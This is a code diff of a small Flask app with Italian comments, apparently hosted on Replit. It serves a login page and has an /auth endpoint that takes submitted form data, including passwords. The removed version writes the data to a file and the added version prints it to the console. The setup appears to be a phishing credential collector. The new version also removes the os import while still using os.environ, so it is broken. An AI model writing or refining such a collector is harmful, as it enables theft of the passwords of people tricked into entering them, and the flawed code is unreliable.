@@ -1,28 +1,20 @@
-from flask import Flask, render_template, request, make_response
-import os
-import json
+from flask import Flask, send_file, make_response
 
 app = Flask(__name__)
 
-# Endpoint per ricevere la password
-@app.route("/auth", methods=["POST"])
-def auth():
-    data = request.form.to_dict()  # prende i dati dal form
-    print(data)  # per debug, appare nella console Replit
-
-    # Salva i dati in database.json
-    with open("database.json", "a") as f:
-        f.write(json.dumps(data) + "\n")
-
-    return "ok"
-
-# Pagina login
 @app.route("/")
 def index():
-    response = make_response(render_template("login.html"))
-    response.headers.add("Access-Control-Allow-Origin", "*")
+    # Restituisce subito login.html con status 200
+    response = make_response(send_file("login.html"))
+    response.status_code = 200
     return response
 
+@app.route("/auth", methods=["POST"])
+def auth():
+    from flask import request
+    data = request.form.to_dict()
+    print(data)  # qui vedi la password nella console
+    return "ok", 200
+
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))  # necessario per Replit
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
